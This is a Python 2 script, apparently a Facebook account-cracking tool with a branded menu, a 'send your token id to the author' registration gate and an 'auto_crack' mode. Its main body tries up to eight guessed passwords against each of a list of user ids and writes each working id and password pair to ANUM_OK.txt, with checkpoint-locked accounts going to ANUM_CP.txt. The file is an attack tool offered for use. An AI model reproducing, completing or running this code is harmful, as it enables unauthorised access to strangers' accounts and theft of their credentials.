# Author : Anum Shahzadi
# Lang used : python2
# Github : github.com/Rabiakhan372
...
__author__ = 'Anum Shahzadi'
__copyright = 'All rights reserved . Copyright  Anum Shahzadi'
...
def reg():
    ...
    if to in r:
        ...
        print ''
        print ' \x1b[1;92mCopy token id and send to Anum Shahzadi'
        print ''
        print ' \x1b[1;92mYour id: ' + to
        print ''
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/100000631119286')
        reg()
...
def reg2():
    ...
    print ''
    print ' \x1b[1;92mCopy and press enter , And Send it On Facebook'
    print ''
...
def log_menu_s():
    s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80ANUM\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu_s():
    ms = raw_input('\x1b[1;92m\xe2\x95\xb0\xe2\x94\x80ANUM\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('clear')
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80ANUM\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ''
        ...
        print ''
        a_s()
    print ' Total Anum_shahzadi: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;93m Process Has Been Started '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mQueen Of Facebook Anum Shahzadi\x1b[0;97m'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[ANUM-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/Anum_shahzadi/ANUM_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[ANUM-CP] ' + uid + ' | ' + pass1
                cp = open('ANUM_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[ANUM-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/Anum_shahzadi/ANUM_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[ANUM-CP] ' + uid + ' | ' + pass2
                    cp = open('ANUM_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[ANUM-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/Anum_shahzadi/ANUM_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[ANUM-CP] ' + uid + ' | ' + pass3
                        cp = open('ANUM_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[ANUM-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/Anum_shahzadi/ANUM_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[ANUM-CP] ' + uid + ' | ' + pass4
                            cp = open('ANUM_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[ANUM-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/Anum_shahzadi/ANUM_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[ANUM-CP] ' + uid + ' | ' + pass5
                                cp = open('ANUM_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[ANUM-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/Anum_shahzadi/ANUM_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[ANUM-CP] ' + uid + ' | ' + pass6
                                    cp = open('ANUM_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[ANUM-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/Anum_shahzadi/ANUM_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[ANUM-CP] ' + uid + ' | ' + pass7
                                        cp = open('ANUM_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[ANUM-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/Anum_shahzadi/Anum_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[ANUM-CP] ' + uid + ' | ' + pass8
                                            cp = open('ANUM_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
